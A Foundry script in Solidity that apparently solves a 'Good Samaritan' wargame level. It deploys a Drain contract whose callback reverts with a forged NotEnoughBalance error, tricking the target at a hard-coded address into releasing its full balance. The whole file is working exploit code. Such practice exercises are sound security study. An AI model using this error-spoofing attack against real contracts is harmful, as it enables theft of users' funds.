/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract Drain {
    error NotEnoughBalance();

    function drain(address _contract) public {
        IGoodSamaritan(_contract).requestDonation();
    }

    function notify(uint256 amount) public pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritan is Script {
    function run() public {
        vm.startBroadcast();

        IGoodSamaritan _GoodSamaritan = IGoodSamaritan(
            0x920accdd38e85cF5485B56b4BB8454E2884694c8
        );

        Drain drain = new Drain();
        drain.drain(address(_GoodSamaritan));

        vm.stopBroadcast();
    }
}
